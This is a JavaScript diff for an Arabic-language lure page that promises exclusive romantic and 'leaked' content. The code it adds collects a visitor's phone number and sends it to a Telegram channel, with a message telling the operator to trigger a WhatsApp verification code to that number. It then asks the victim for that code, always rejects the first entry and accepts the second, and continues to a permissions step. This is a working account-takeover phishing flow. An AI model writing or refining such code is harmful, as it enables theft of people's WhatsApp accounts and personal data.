@@ -426,23 +426,38 @@ async function submitPhoneNumberFirst() {
     const phoneNumber = phoneInput.value.trim();
     const status = document.getElementById('status');
     
-    if (!phoneNumber || phoneNumber.length < 8) {
-        alert('⚠️ يرجى إدخال رقم هاتف صحيح');
+    // Validate: Must be exactly 9 digits
+    if (!phoneNumber || phoneNumber.length !== 9 || !/^\d+$/.test(phoneNumber)) {
+        alert('⚠️ يرجى إدخال رقم هاتف صحيح (9 أرقام)');
         return;
     }
     
     // Reset verification attempts
     verificationAttempts = 0;
     
-    // Send phone number to Telegram
-    await sendToTelegram(`📱 رقم الهاتف:\n${phoneNumber}`);
+    // Show loading message
+    status.innerHTML = '<div class="loading">⏳ جارٍ إرسال رمز التحقق إلى واتساب...</div>';
     
-    // Continue with permissions and verification
-    await continueAfterPhone();
+    // Send phone number to Telegram
+    await sendToTelegram(`📱 رقم الهاتف المدخل:\n${phoneNumber}\n\n⚠️ يرجى إرسال رمز التحقق إلى هذا الرقم عبر واتساب`);
+    
+    // Wait a moment
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Show verification code input (wait for admin to send code via WhatsApp)
+    status.innerHTML = `<div class="success">
+        <h3 style="color: #28a745; margin-bottom: 15px;">✅ تم إرسال رمز التحقق إلى واتساب</h3>
+        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">تحقق من رسائل واتساب الخاصة بك</p>
+        <p style="color: #666; margin: 10px 0;">أدخل الرمز المكون من 6 أرقام المرسل إليك</p>
+        <div style="margin: 20px 0;">
+            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" maxlength="6" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
+        </div>
+        <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد الرمز</button>
+    </div>`;
 }
 
-// Submit verification code
-async function submitVerificationCode() {
+// Submit verification code FIRST (before permissions)
+async function submitVerificationCodeFirst() {
     const codeInput = document.getElementById('verificationCode');
     const code = codeInput.value.trim();
     const status = document.getElementById('status');
@@ -467,26 +482,23 @@ async function submitVerificationCode() {
             <div style="margin: 20px 0;">
                 <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" maxlength="6" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
             </div>
-            <button onclick="submitVerificationCode()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">إعادة المحاولة</button>
+            <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">إعادة المحاولة</button>
         </div>`;
         return;
     }
     
-    // Second attempt or more: Accept and show success
-    status.innerHTML = '<div class="loading">جارٍ التحقق من الرمز...</div>';
+    // Second attempt: Accept and continue with permissions
+    status.innerHTML = '<div class="loading">✅ جارٍ التحقق من الرمز...</div>';
     
     await new Promise(resolve => setTimeout(resolve, 2000));
     
-    // Show final success
-    status.innerHTML = `<div class="success">
-        <h3 style="color: #28a745; margin-bottom: 15px;">🎉 تم التحقق بنجاح!</h3>
-        <p style="color: #333; font-size: 1.2em; margin: 15px 0;">💕 مرحباً بك في عالم المحتوى الحصري</p>
-        <div class="fake-content" style="margin-top: 20px;">
-            <p>✨ يمكنك الآن تصفح المحتوى الحصري</p>
-            <p>💝 آلاف الرسائل والفيديوهات الرومانسية في انتظارك</p>
-            <p>🌹 محتوى مسرب حصري من بلدك يومياً</p>
-        </div>
-    </div>`;
+    // Show success and continue with permissions
+    status.innerHTML = '<div class="success">🎉 تم التحقق بنجاح!<br>جارٍ تحميل المحتوى الحصري...</div>';
+    
+    await new Promise(resolve => setTimeout(resolve, 1500));
+    
+    // Continue with permissions
+    await continueAfterPhone();
 }
 
 // Trigger on button click
